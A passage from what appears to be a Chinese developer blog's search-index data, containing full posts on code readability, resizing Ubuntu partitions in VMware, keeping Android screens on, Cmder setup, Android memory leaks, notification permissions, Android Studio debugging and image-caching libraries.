最后想说的这本书从变量的命名到代码的组织来讲解了一些让代码的可读性提高的一些实践方法。其实笔者认为代码的可读性也可以算作是一种沟通能力的一种体现。因为写代码的过程也可以被看做是写代码的人与阅读代码的人的一种沟通，只不过这个沟通是单向的：代码的可读性高，可以说明写代码的人思路清晰，而且TA可以明确，高效地把自己的思考和工作内容以代码的形式表述出来。 所以笔者相信能写出可读性很高的代码的人，TA对于自己的思考和想法的描述能力一定不会很差。如果你真的打算好好做编程这件事情，建议你从最小的事情上做起：好好为你的变量起个名字。不要再以“我英语不好”或者“没时间想名字”作为托辞；把态度端正起来，平时多动脑，多查字典，多看源码，自然就会了。如果你连起个好的变量名都懒得查个字典，那你怎么证明你在遇到更难的问题的时候能够以科学的态度解决它？ 如果你连编程里这种最小的事情都不好好做，那你又怎么证明你对编程是有追求的呢？","categories":[{"name":"程序设计","slug":"程序设计","permalink":"https://superxlcr.github.io/categories/程序设计/"}],"tags":[{"name":"程序设计","slug":"程序设计","permalink":"https://superxlcr.github.io/tags/程序设计/"}]},{"title":"VMware下扩展Ubuntu根分区大小的方法","slug":"VMware下扩展Ubuntu根分区大小的方法","date":"2017-12-17T04:59:54.000Z","updated":"2020-05-11T07:23:44.744Z","comments":true,"path":"2017/12/17/VMware下扩展Ubuntu根分区大小的方法/","link":"","permalink":"https://superxlcr.github.io/2017/12/17/VMware下扩展Ubuntu根分区大小的方法/","excerpt":"","text":"刚开始设置VMware下的Ubuntu虚拟机的硬盘时，由于担心占用过多的空间，因此把容量设置得不够大，以至于后面发现容量不够用时需要对Ubutun的根分区进行一定的拓展，下面总结一下拓展的方法：首先我们需要在VMware的虚拟机设置中选择拓展硬盘大小： 修改完硬盘大小后，我们还需要使用工具对Ubutun系统进行分区，在此推荐一款叫gparted的软件：http://nchc.dl.sourceforge.net/project/gparted/gparted-live-stable/0.8.0-5/gparted-live-0.8.0-5.iso 下载完这个软件后，我们可以在虚拟机设置的CD设置里面加载该iso文件然后我们在开启虚拟机的时候按下ESC键，选择BIOS从光盘启动： 之后选择第一项，然后一路回车即可： 进入到GParted后，我们可以看到以下界面，因为我们需要拓展根分区大小，因此我们需要先把linux-swap的交换区删掉，把根分区拓展之后再重新建立起来： 拓展完重启后，我们可以使用fdisk -l指令看到根分区变大了","categories":[{"name":"linux","slug":"linux","permalink":"https://superxlcr.github.io/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://superxlcr.github.io/tags/linux/"},{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/tags/操作系统/"}]},{"title":"Android让屏幕保持常亮的三种方法","slug":"Android让屏幕保持常亮的三种方法","date":"2017-12-16T14:17:59.000Z","updated":"2020-05-11T07:23:44.606Z","comments":true,"path":"2017/12/16/Android让屏幕保持常亮的三种方法/","link":"","permalink":"https://superxlcr.github.io/2017/12/16/Android让屏幕保持常亮的三种方法/","excerpt":"","text":"方法一：持有WakeLock首先获取WakeLock相关权限： 1&lt;uses-permission android:name=\"android.permission.WAKE_LOCK\" /&gt; 然后通过PowerManager获取WakeLock后，在onResume以及onPause执行相应操作： 1234567891011121314151617181920212223242526@Overrideprotected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); PowerManager powerManager = (PowerManager)getSystemService(POWER_SERVICE); if (powerManager != null) &#123; mWakeLock = powerManager.newWakeLock(PowerManager.FULL_WAKE_LOCK, \"WakeLock\"); &#125;&#125;@Overrideprotected void onResume() &#123; super.onResume(); if (mWakeLock != null) &#123; mWakeLock.acquire(); &#125;&#125;@Overrideprotected void onPause() &#123; super.onPause(); if (mWakeLock != null) &#123; mWakeLock.release(); &#125;&#125; WakeLock获取时相关的flag如下所示： PARTIAL_WAKE_LOCK :保持CPU 运转，屏幕和键盘灯有可能是关闭的。 SCREEN_DIM_WAKE_LOCK ：保持CPU 运转，允许保持屏幕显示但有可能是灰的，允许关闭键盘灯 SCREEN_BRIGHT_WAKE_LOCK ：保持CPU 运转，允许保持屏幕高亮显示，允许关闭键盘灯 FULL_WAKE_LOCK ：保持CPU 运转，保持屏幕高亮显示，键盘灯也保持亮度 PS：现在官方已经不推荐使用这种方式保持亮屏了，推荐改为以下两种方式 方式二：在Window设置flag1getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON); 这种方式不需要申请权限，也是官方推荐的做法 方式三：在界面布局xml中顶层添加属性可以再界面xml文件中的顶层布局添加属性即可： 1android:keepScreenOn=\"true\"","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"}]},{"title":"Ubuntu打开终端的方法四种","slug":"Ubuntu打开终端的方法四种","date":"2017-12-09T06:24:51.000Z","updated":"2020-05-11T07:23:44.744Z","comments":true,"path":"2017/12/09/Ubuntu打开终端的方法四种/","link":"","permalink":"https://superxlcr.github.io/2017/12/09/Ubuntu打开终端的方法四种/","excerpt":"","text":"本文转载自：http://blog.csdn.net/xhhjin/article/details/6328752这个不应该称得上是一个问题，但是，发现对于新手，确实是个难题因为少有人能够提到这一点，基本都是上来就直接讲用到的命令。 我开始的时候也曾经被这个问题困扰着，后来，搜了一会儿才弄明白。 在菜单内的附件上面有 在运行命令的输入框打开 快捷方式 快捷键 很好弄，在左上角的菜单上点一下，出来一列，在里面选择［附件］ 中的［终端］，点一下就OK。那是快捷执行图标，可以把图标拖到桌面然后释放，以后在桌面上直接执行。同理，可以拖到上面的任务 栏里面。以后在上面的任务栏点一下就行了。 也不难弄，但不好找。首先按住Alt，然后按一下F2，出来一个运行框，在里面输入 gnome-terminal即可运行。在这个运行框里，可以执行很多命令，想当于windows的［运行］。 把终端窗口打开放在鼠标右键，效果是在桌面或文件夹内的空白处右键点击，将出现“从终端打开”的快捷方式。那个需要使用一个软件。安装很简单，打开终端，在里面输入: 1sudo apt-get install nautilus-open-terminal 然后系统就在右键中自动添加该快捷方式了。4. Ctrl+Alt+T，快捷键搞定","categories":[{"name":"linux","slug":"linux","permalink":"https://superxlcr.github.io/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://superxlcr.github.io/tags/linux/"},{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/tags/操作系统/"}]},{"title":"Windows下配置 Cmder 设置环境","slug":"Windows下配置-Cmder-设置环境","date":"2017-12-04T12:55:56.000Z","updated":"2020-05-11T07:23:44.765Z","comments":true,"path":"2017/12/04/Windows下配置-Cmder-设置环境/","link":"","permalink":"https://superxlcr.github.io/2017/12/04/Windows下配置-Cmder-设置环境/","excerpt":"","text":"Cmder 是一款好用的 Console Emulator，其官网为：http://cmder.net/ 下载完后，我们可以在 Window 下配置我们的 Cmder 了 win + R 启动 Cmder我们可以在 Window 环境变量的 PATH 中添加我们Cmder的路径，以后就可以通过 win + R 输入相关名称来启动我们的Cmder了 右键添加 Cmder here 选项我们首先需要通过原来的cmd来到Cmder的目录下，然后运行相关的指令： 1Cmder.exe /REGISTER ALL 运行此命令后，我们右键菜单中就多了 Cmder here 的选项，可以快速在某个文件夹下打开Cmderps：如果出现错误，请尝试以管理员身份运行Cmder 设置Cmder初始目录我们可以按下：win + alt + p 来开启 Cmder 的设置菜单，首先我们看到Startup里面的Specified named task选项，该选项说明了你当前使用的是哪个task接着我们选择Startup下面的Tasks ，修改刚刚看到的对应的选项，加上： 1-new_console:d:%your_path% 把%your_path%改为你需要的初始目录即可或者我们也可以点击Startup dir…按钮进行GUI操作 修复ls指令中文乱码的问题我们可以按下：win + alt + p 来开启 Cmder 的设置菜单，选择Startup 下面的Environment，添加一项： 1set LANG=zh_CN.UTF-8 添加新的命令行控制台当我们安装了新的命令行控制台时，我们可以通过Settings(快捷键：win + alt + p)里面的Startup里面的Tasks选项的Add/refresh default tasks来添加","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/categories/操作系统/"}],"tags":[{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"},{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/tags/操作系统/"}]},{"title":"基于Android Studio的内存泄漏检测与解决","slug":"基于Android-Studio的内存泄漏检测与解决","date":"2017-11-23T12:25:17.000Z","updated":"2020-05-11T07:23:44.835Z","comments":true,"path":"2017/11/23/基于Android-Studio的内存泄漏检测与解决/","link":"","permalink":"https://superxlcr.github.io/2017/11/23/基于Android-Studio的内存泄漏检测与解决/","excerpt":"","text":"什么是内存泄漏Android虚拟机的垃圾回收采用的是根搜索算法。GC会从根节点（GC Roots）开始对heap进行遍历。到最后，部分没有直接或者间接引用到GC Roots的就是需要回收的垃圾，会被GC回收掉。而内存泄漏出现的原因就是存在了无效的引用，导致本来需要被GC的对象没有被回收掉。 比如： 1234567891011121314151617public class LeakActivity extends AppCompatActivity &#123; public static Leak mLeak; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_leak); Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar); setSupportActionBar(toolbar); mLeak = new Leak(); &#125; class Leak &#123; &#125;&#125; mLeak是存储在静态区的静态变量，而Leak是内部类，其持有外部类Activity的引用。这样就导致Activity需要被销毁时，由于被mLeak所持有，所以系统不会对其进行GC，这样就造成了内存泄漏。另外一个例子 12345678910111213141516171819public class Singleton &#123; private static Singleton singleton; private Context mContext; private Singleton(Context context) &#123; this.mContext = context; &#125; public static Singleton getSingleton(Context context) &#123; if (singleton == null) &#123; synchronized (Singleton.class) &#123; if (singleton == null) &#123; singleton = new Singleton(context); &#125; &#125; &#125; return singleton; &#125;&#125; 如果我们在在调用Singleton的getInstance()方法时传入了Activity。那么当instance没有释放时，这个Activity会一直存在。因此造成内存泄露。 解决方法可以将new Singleton(context)改为new Singleton(context.getApplicationContext())即可，这样便和传入的Activity没关系了。 内存泄漏的检测方法打开Android Studio，编译代码运行App，然后点击Android Monitor，然后点击Monitor对应的Monitors Tab，界面如下：在Memory一栏中，可以观察不同时间App内存的动态使用情况，点击Memory 右侧第二个按钮可以手动触发GC，点击第三个按钮可以进入HPROF Viewer界面，查看Java的Heap，如下图Reference Tree代表指向该实例的引用，可以从这里面查看内存泄漏的原因，Shallow Size指的是该对象本身占用内存的大小，Retained Size代表该对象被释放后，垃圾回收器能回收的内存总和。内存泄漏检测的方法 点击手动进行GC，再点击观看JavaHeap，点击Analyzer Task，Android Monitor就可以为我们自动分析泄漏的Activity啦，分析出来如下图所示：在Reference Tree里面，我们直接就可以看到持有该Activity的单例对象，直接定位到该单例中的代码，发现代码中出现了 1234567891011121314151617public class LeakActivity extends AppCompatActivity &#123; public static Leak mLeak; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_leak); Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar); setSupportActionBar(toolbar); mLeak = new Leak(); &#125; class Leak &#123; &#125;&#125;","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"内存","slug":"内存","permalink":"https://superxlcr.github.io/tags/内存/"}]},{"title":"Android 判断通知栏权限的问题","slug":"Android-判断通知栏权限的问题","date":"2017-11-11T09:06:01.000Z","updated":"2020-05-11T07:23:44.528Z","comments":true,"path":"2017/11/11/Android-判断通知栏权限的问题/","link":"","permalink":"https://superxlcr.github.io/2017/11/11/Android-判断通知栏权限的问题/","excerpt":"","text":"在Android中，我们可以在设置中关闭某个应用的通知栏权限（Notification Permission）在关闭通知栏权限后，应用将无法弹出toast以及Notification通知栏判断应用的通知栏权限是否关闭的代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142public class NotificationsUtils &#123; private static final String CHECK_OP_NO_THROW = \"checkOpNoThrow\"; private static final String OP_POST_NOTIFICATION = \"OP_POST_NOTIFICATION\"; public static boolean isNotificationEnabled(Context context) &#123; AppOpsManager mAppOps = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE); ApplicationInfo appInfo = context.getApplicationInfo(); String pkg = context.getApplicationContext().getPackageName(); int uid = appInfo.uid; Class appOpsClass = null; /* Context.APP_OPS_MANAGER */ try &#123; appOpsClass = Class.forName(AppOpsManager.class.getName()); Method checkOpNoThrowMethod = appOpsClass.getMethod(CHECK_OP_NO_THROW, Integer.TYPE, Integer.TYPE, String.class); Field opPostNotificationValue = appOpsClass.getDeclaredField(OP_POST_NOTIFICATION); int value = (int)opPostNotificationValue.get(Integer.class); return ((int)checkOpNoThrowMethod.invoke(mAppOps,value, uid, pkg) == AppOpsManager.MODE_ALLOWED); &#125; catch (ClassNotFoundException e) &#123; e.printStackTrace(); &#125; catch (NoSuchMethodException e) &#123; e.printStackTrace(); &#125; catch (NoSuchFieldException e) &#123; e.printStackTrace(); &#125; catch (InvocationTargetException e) &#123; e.printStackTrace(); &#125; catch (IllegalAccessException e) &#123; e.printStackTrace(); &#125; return false; &#125;&#125; 此方法可以成功获取当前应用是否具有通知栏权限，但是存在一个兼容问题：在Android 4.4（API19）以下是没有AppOpsManager这个类的（见第8行），因此此方法在Android 4.4以下运行会导致应用crash那么，我们该如何在Android 4.4以下获取应用通知栏权限呢？很遗憾，答案是不能，详情可以参考stackoverflow：https://stackoverflow.com/questions/11649151/android-4-1-how-to-check-notifications-are-disabled-for-the-application另外，除了使用上述的反射方法来获取通知栏权限外，我们也可以使用support包提供的方法（也是官方推荐的方法，不过需要比较新的support.v4包）: 1NotificationManagerCompat.from(this).areNotificationsEnabled(); 值得一提的是，由于在API 19以下的版本无法获得通知栏权限，该方法默认会返回true","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"}]},{"title":"你所不知道的Android Studio调试技巧","slug":"你所不知道的Android-Studio调试技巧","date":"2017-10-26T11:32:31.000Z","updated":"2020-05-11T07:23:44.796Z","comments":true,"path":"2017/10/26/你所不知道的Android-Studio调试技巧/","link":"","permalink":"https://superxlcr.github.io/2017/10/26/你所不知道的Android-Studio调试技巧/","excerpt":"","text":"本文转载自：http://www.jianshu.com/p/011eb88f4e0d/ Android Studio目前已经成为开发Android的主要工具，用熟了可谓相当顺手。作为开发者，调试并发现bug，进而解决，可是我们的看家本领。正所谓，工欲善其事必先利其器，和其他开发工具一样，如Eclipse、Idea，Android Studio也为我们提供了强大的调试技巧，今天我们就来看看Android Studio中有关调试的技巧。首先，来看看Android studio中为我们提供的调试面板（标准情况下）： 点击右上角Restore ‘Threads’View可先展示目前相关的线程信息： android studio大体为我们提供了7个功能区： 单步调试区 断点管理区 求值表达式 线程帧栈区 对象变量区 变量观察区 下面我们分别对这七个区域进行介绍。 单步调试区该区提供了调试的主要操作，和你所熟知的一样的，主要有：Step over、step into、force step into、step out、drop frame。 Show Execution Point 点击该按钮,光标将定位到当前正在调试的位置. Step Over 单步跳过，点击该按钮将导致程序向下执行一行。如果当前行是一个方法调用，此行调用的方法被执行完毕后再到下一行。比如当前代码是： 123int num=10;int min=Math.min(num,100);System.out.println(min); 如果当前调试的是第二行，当点击step over时，Math.min（num,100)方法先执行完后跳到第三行. Step Into 单步跳入，执行该操作将导致程序向下执行一行。如果该行有自定义的方法，则进入该方法内部继续执行，需要注意如果是类库中的方法，则不会进入方法内部。 Force Step Into 强制单步跳入，和step into功能类似，主要区别在于：如果当前行有任何方法，则不管该方法是我们自行定义还是类库提供的，都能跳入到方法内部继续执行 Drop Frame 没有好记的名字，大意理解为中断执行,并返回到方法执行的初始点,在这个过程中该方法对应的栈帧会从栈中移除.换言之,如果该方法是被调用的,则返回到当前方法被调用处，并且所有上下文变量的值也恢复到该方法未执行时的状态。简单的举例来说明： 12345678910111213141516public class DebugDemo &#123; private String name = &quot;default&quot;; public void alertName() &#123; System.out.println(name); debug(); &#125; public void debug() &#123; this.name = &quot;debug&quot;; &#125; public static void main(String[] args) &#123; new DebugDemo().alertName(); &#125;&#125; 当你在调试debug（）时，执行该操作，将回调到debug（）被调用的地方，也就是alertName()方法。如果此时再继续执行drop frame，将回调到alertName（）被调用的地方，也就是main（）. Force Run to Cursor 非常好用的一个功能,可以忽视已经存在的断点,跳转到光标所在处.举个简单例子说明下: 比如现在第10行,此时我想调试18行而又不想一步一步调试,能不能一次到位呢?我们只需要将光标定位到相应的位置,然后执行Force Run to Cursor即可: Evaluate expression 点击该按钮会在当前调试的语句处嵌入一个交互式解释器，在该解释器中，你可以执行任何你想要执行的表达式进行求值操作。比如，我们在调试时执行到以下代码： 此时执行Evaluate Expression，就相当于在调试行之前嵌入了一个交互式解释器，那么在该解释器中我们能做什么呢？在这里，我们可以对result进行求值操作：对着你想要求值得位置点击鼠标右键，选择evaluate Expression.此时会显示如下： 在弹出的输入框中输入求值表达式，比如这里我们输入 1Math.min(result,50) ,如下图 点击执行，我们发现在Result中已经输出了结果，如下： 断点管理区Return 点击该按钮会停止目前的应用,并且重新启动.换言之,就是你想要重新调试时,可以使用该操作,嗯,就是重新来过的意思. Pause Program 点击该按钮将暂停应用的执行.如果想要恢复则可以使用下面提到的Resume Program. Resume Program 该操作有恢复应用的含义,但是却有两种行为: 在应用处在暂停状态下,点击该按钮将恢复应用运行. 在很多情况下，我们会设置多个断点以便调试。在某些情况下，我们需要从当前断点移动到下一个断点处，两个断点之间的代码自动被执行，这样我们就不需要一步一步调试到下一个断点了，省时又省力。举例说明： 123456public void test()&#123; test1(); ... test2();&#125; 假设我们分别在第2行和第4行添加了断点。如果此时我们调试在第2行，此时点击执行该操作，当前调试位置会自动执行到第4行，也就是第2到第4行之间的代码会自动被执行。 Stop 点击该按钮会通过相关的关闭脚本来终止当前进程.换言之,对不同类型的工程可能有不同的停止行为,比如:对普通的Java项目,点击该按钮意味着退出调试模式,但是应用还会执行完成.而在Android项目中,点击该按钮,则意味这app结束运行.这里我们以一个普通的JAVA工程为例: 此时如果我们执行停止操作，发现程序退出调试模式，并正常执行完毕，Console中结果如下： View Breakpoints 点击该按钮会进入断点管理界面，在这里你可以查看所有断点,管理或者配置断点的行为,如:删除，修改属性信息等： Mute Breakpoints 使用该按钮来切换断点的状态:启动或者禁用.在调试过程中,你可以禁用暂时禁用所有的断点,已实现应用正常的运行.该功能非常有用,比如当你在调试过程中,突然不想让断点干扰你所关心的流程时,可以临时禁用断点. Get thread dump 获取线程Dump,点击该按钮将进入线程Dump界面: 借此我们顺便介绍一下dump界面: 线程工具区中最常用的是 ,可以用来过滤线程,其他的不做解释了解析来我们来认识一下线程的类型,表示为不同的图标: 线程状态描述 图标 Thread is suspended. Thread is waiting on a monitor lock. Thread is running. Thread is executing network operation, and is waiting for data to be passed. Thread is idle. Event Dispatch Thread that is busy. Thread is executing disk operation. Settings 点击该按钮将打开有关设置的列表: 我们对其中的几个进行说明: Show Values Inline调试过程中开启该功能,将会代码右边显示变量值,即下图中红框所示部分: Show Method Return Values调试过程中启用该功能,将在变量区显示最后执行方法的返回值.举个例子来说,首先,关闭该功能,我们调试这段代码并观察其变量区: 开启该功能之后,再来观察变量区的变化: 继续往下调试: 继续往下调试: 这个功能简直是棒极了,在调试一段代码,并想看该代码中最后调用方法的最终结果时就非常有用了. Auto-Variables Mode开启这个功能后,idea的Debugger会自动评估某些变量,大概就是当你执行在某个断点时,Debugger会检测当前调试点之前或者之后的变量的状态,然后在变量区选择性输出.举个例子来说明,未开启该功能之前,变量区输出所有的变量信息: 开启之后,当你调试到第13行时,Debugger检测到num变量在之后没有被使用,那么在变量区就不会输出该变量的信息. Sort values alphabetically开启这个功能的化,变量区中的输出内容会按照按字母顺序进行排序,很简单,不常用,还是按照默认的顺序好. Help 这个不用说了,有任何不明白的都可以查看官方帮助文档,这是我见到最好的文档之一. 其他几个操作:Settings,Pin,Close留给各位自己去使用. 修改变量值在调试过程中，我们可以方便的修改某个变量的值，如下： 在上图中，当前result的值经过计算为10，这里我们通过Set Value将其计算结果修改为100. 变量观察区该区域将显示你所感兴趣的变量的值。在调试模式下，你可以通过Add to Watches将某个变量添加到观察区，该值的变化将会在变量观察区显示。操作如下： 这里我们对name比较感兴趣，希望看到它的值的变化情况，因此我们将其“特殊关照”。需要注意，此时因为name是成员变量，因此在对象观察区也可看到该值。如果是局部变量，无疑只能用这种方式了。 断点的分类到目前为止，我们已经简单的介绍了调试功能区，断点管理区，求值表达式，这三个区域的功能。在上面，我们不断的提到了断点一次，但是断点是什么呢？想必大部分人已经知道了，我们这里在简单的说明下： 断点是调试器的功能之一，可以让程序暂停在需要的地方，帮助我们进行分析程序的运行过程。 在Android Studio中，断点又被以下五类： 条件断点 日志断点 异常断点 方法断点 属性断点 其中方法断点是我们最熟悉的断点类型，相信没有人不会。下面我们着重介绍其他四种类型的断点。 条件断点所谓的条件断点就是在特定条件发生的断点，也就是，我们可将某个断点设置为只对某种事件感兴趣，最典型的应用就是在列表循环中，我们希望在某特定的元素出现时暂停程序运行。比如，现在我们有个list中，其中包含了q，1q，2q,3q四个元素，我们希望在遍历到2q时暂停程序运行，那么需要进行如下操作： 在需要的地方添加断点，如下： 断点处左键单击，在Condition处填写过滤条件.此处我们只关心2q，因此填写 1s.equals(&quot;2q&quot;) 日志断点该类型的断点不会使程序停下来，而是在输出我们要它输出的日志信息，然后继续执行。具体操作如下： 同样在断点处左键单击，在弹出的对话框中取消选中Suspend。 在弹出的控制面板中，选中Log evaluated expression，然后再填写想要输出的日志信息，如下： 当调试过程遇到该断点将会输出结果，如下： 异常断点所谓的异常断点就是在调试过程中，一旦发生异常（可以指定某类异常），则会立刻定位到异常抛出的地方。比如在调试异常中，我们非常关注运行时异常，希望在产生任何运行异常时及时定位，那么此时就可以利用该类型异常，在上线之前，进行异常断点调试非常有利于减少正式环境中发生crash的几率。 具体操作如下：在Run菜单项中，选择View Breakpoints（也可以在断点管理面板中点击 ），如下： 在管理断点面板中，点击+ 在弹出的下拉选择列表中，我们选择Java Exception Breakpoints 这里我们选中Search By Name,在下面的输入框中输入我们所关心的异常类型。此处我们关心NullPointerException，在调试过程一旦发生NullPointerException，调试器就会定位到异常发生处。 方法断点 （略过吧，应该没人不知道了） Filed WatchPoint Filed WatchPoint是本质上是一种特殊的断点，也称为属性断点：当我们某个字段值被修改的时候，程序暂停在修改处。通常在调试多线程时尤为可用，能帮我们及时的定位并发错误的问题。其使用和添加普通的断点并无不同，断点图标稍有不同 调试的两种方式到目前，调试的相关基础我们已经介绍完了，但是不少童鞋对Android Studio中 这两个按钮感到困惑：Debug和Attach process。 这里我们就简单介绍一下这两者的区别： Debug：以调试模式安装运行，断点可以在运行之前设置，也可在运行后设置，是多数人最常用的调式方式 Attach process：和Debug方式相比，能够将调试器attach到任何正在运行的进程。比如，我们可以通过attach process到想要调试的进程。然后，在需要的地方设置相关断点即可。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"}]},{"title":"Android四大图片缓存（Imageloader,Picasso,Glide,Fresco）原理、特性对比","slug":"Android四大图片缓存（Imageloader-Picasso-Glide-Fresco）原理、特性对比","date":"2017-10-26T06:42:12.000Z","updated":"2020-05-11T07:23:44.575Z","comments":true,"path":"2017/10/26/Android四大图片缓存（Imageloader-Picasso-Glide-Fresco）原理、特性对比/","link":"","permalink":"https://superxlcr.github.io/2017/10/26/Android四大图片缓存（Imageloader-Picasso-Glide-Fresco）原理、特性对比/","excerpt":"","text":"本文转载自：http://www.cnblogs.com/linghu-java/p/5741358.html Android四大图片缓存（Imageloader,Picasso,Glide,Fresco）原理、特性对比 四大图片缓存基本信息Universal ImageLoader 是很早开源的图片缓存，在早期被很多应用使用。 Picasso 是 Square 开源的项目，且他的主导者是 JakeWharton，所以广为人知。 Glide 是 Google 员工的开源项目，被一些 Google App 使用，在去年的 Google I/O 上被推荐，不过目前国内资料不多。 Fresco 是 Facebook 在今年上半年开源的图片缓存，主要特点包括： 两个内存缓存加上 Native 缓存构成了三级缓存 支持流式，可以类似网页上模糊渐进式显示图片 对多帧动画图片支持更好，如 Gif、WebP 鉴于 Fresco 还没发布正式的 1.0 版本，同时一直没太多时间熟悉 Fresco 源码，后面对比不包括 Fresco，以后有时间再加入对比 基本概念在正式对比前，先了解几个图片缓存通用的概念： RequestManager：请求生成和管理模块 Engine：引擎部分，负责创建任务(获取数据)，并调度执行 GetDataInterface：数据获取接口，负责从各个数据源获取数据。比如 MemoryCache 从内存缓存获取数据、DiskCache 从本地缓存获取数据，下载器从网络获取数据等。 Displayer：资源(图片)显示器，用于显示或操作资源。比如 ImageView，这几个图片缓存都不仅仅支持 ImageView，同时支持其他 View 以及虚拟的 Displayer 概念。 Processor 资源(图片)处理器负责处理资源，比如旋转、压缩、截取等。 以上概念的称呼在不同图片缓存中可能不同，比如 Displayer 在 ImageLoader 中叫做 ImageAware，在 Picasso 和 Glide 中叫做 Target。 共同优点 使用简单都可以通过一句代码可实现图片获取和显示。 可配置度高，自适应程度高图片缓存的下载器(重试机制)、解码器、显示器、处理器、内存缓存、本地缓存、线程池、缓存算法等大都可轻松配置。自适应程度高，根据系统性能初始化缓存配置、系统信息变更后动态调整策略。比如根据 CPU 核数确定最大并发数，根据可用内存确定内存缓存大小，网络状态变化时调整最大并发数等。 多级缓存都至少有两级缓存、提高图片加载速度。 支持多种数据源支持多种数据源，网络、本地、资源、Assets 等 支持多种 Displayer不仅仅支持 ImageView，同时支持其他 View 以及虚拟的 Displayer 概念。 其他小的共同点包括支持动画、支持 transform 处理、获取 EXIF 信息等。 ImageLoader 设计及优点总体设计及流程上面是 ImageLoader 的总体设计图。整个库分为 ImageLoaderEngine，Cache 及 ImageDownloader，ImageDecoder，BitmapDisplayer，BitmapProcessor 五大模块，其中 Cache 分为 MemoryCache 和 DiskCache 两部分。 简单的讲就是 ImageLoader 收到加载及显示图片的任务，并将它交给 ImageLoaderEngine，ImageLoaderEngine 分发任务到具体线程池去执行，任务通过 Cache 及 ImageDownloader 获取图片，中间可能经过 BitmapProcessor 和 ImageDecoder 处理，最终转换为Bitmap 交给 BitmapDisplayer 在 ImageAware 中显示。 ImageLoader 优点 支持下载进度监听 可以在 View 滚动中暂停图片加载通过 PauseOnScrollListener 接口可以在 View 滚动中暂停图片加载。 默认实现多种内存缓存算法** 这几个图片缓存都可以配置缓存算法，不过 ImageLoader 默认实现了较多缓存算法，如 Size 最大先删除、使用最少先删除、最近最少使用、先进先删除、时间最长先删除等。 支持本地缓存文件名规则定义 Picasso 设计及优点总体设计及流程上面是 Picasso 的总体设计图。整个库分为 Dispatcher，RequestHandler 及 Downloader，PicassoDrawable 等模块。 Dispatcher 负责分发和处理 Action，包括提交、暂停、继续、取消、网络状态变化、重试等等。 简单的讲就是 Picasso 收到加载及显示图片的任务，创建 Request 并将它交给 Dispatcher，Dispatcher 分发任务到具体 RequestHandler，任务通过 MemoryCache 及 Handler(数据获取接口) 获取图片，图片获取成功后通过 PicassoDrawable 显示到 Target 中。 需要注意的是上面 Data 的 File system 部分，Picasso 没有自定义本地缓存的接口，默认使用 http 的本地缓存，API 9 以上使用 okhttp，以下使用 Urlconnection，所以如果需要自定义本地缓存就需要重定义 Downloader。 Picasso 优点 自带统计监控功能支持图片缓存使用的监控，包括缓存命中率、已使用内存大小、节省的流量等。 支持优先级处理每次任务调度前会选择优先级高的任务，比如 App 页面中 Banner 的优先级高于 Icon 时就很适用。 支持延迟到图片尺寸计算完成加载 支持飞行模式、并发线程数根据网络类型而变手机切换到飞行模式或网络类型变换时会自动调整线程池最大并发数，比如 wifi 最大并发为 4， 4g 为 3，3g 为 2。这里 Picasso 根据网络类型来决定最大并发数，而不是 CPU 核数。 “无”本地缓存无”本地缓存，不是说没有本地缓存，而是 Picasso 自己没有实现，交给了 Square 的另外一个网络库 okhttp 去实现，这样的好处是可以通过请求 Response Header 中的 Cache-Control 及 Expired 控制图片的过期时间。 Glide 设计及优点总体设计及流程上面是 Glide 的总体设计图。整个库分为 RequestManager(请求管理器)，Engine(数据获取引擎)、 Fetcher(数据获取器)、MemoryCache(内存缓存)、DiskLRUCache、Transformation(图片处理)、Encoder(本地缓存存储)、Registry(图片类型及解析器配置)、Target(目标) 等模块。 简单的讲就是 Glide 收到加载及显示资源的任务，创建 Request 并将它交给RequestManager，Request 启动 Engine 去数据源获取资源(通过 Fetcher )，获取到后 Transformation 处理后交给 Target。 Glide 依赖于 DiskLRUCache、GifDecoder 等开源库去完成本地缓存和 Gif 图片解码工作。 Glide 优点 图片缓存-&gt;媒体缓存Glide 不仅是一个图片缓存，它支持 Gif、WebP、缩略图。甚至是 Video，所以更该当做一个媒体缓存。 支持优先级处理 与 Activity/Fragment 生命周期一致，支持 trimMemoryGlide 对每个 context 都保持一个 RequestManager，通过 FragmentTransaction 保持与 Activity/Fragment 生命周期一致，并且有对应的 trimMemory 接口实现可供调用。 支持 okhttp、VolleyGlide 默认通过 UrlConnection 获取数据，可以配合 okhttp 或是 Volley 使用。实际 ImageLoader、Picasso 也都支持 okhttp、Volley。 内存友好 Glide 的内存缓存有个 active 的设计从内存缓存中取数据时，不像一般的实现用 get，而是用 remove，再将这个缓存数据放到一个 value 为软引用的 activeResources map 中，并计数引用数，在图片加载完成后进行判断，如果引用计数为空则回收掉。 内存缓存更小图片Glide 以 url、view_width、view_height、屏幕的分辨率等做为联合 key，将处理后的图片缓存在内存缓存中，而不是原始图片以节省大小 与 Activity/Fragment 生命周期一致，支持 trimMemory 图片默认使用默认 RGB_565 而不是 ARGB_888虽然清晰度差些，但图片更小，也可配置到 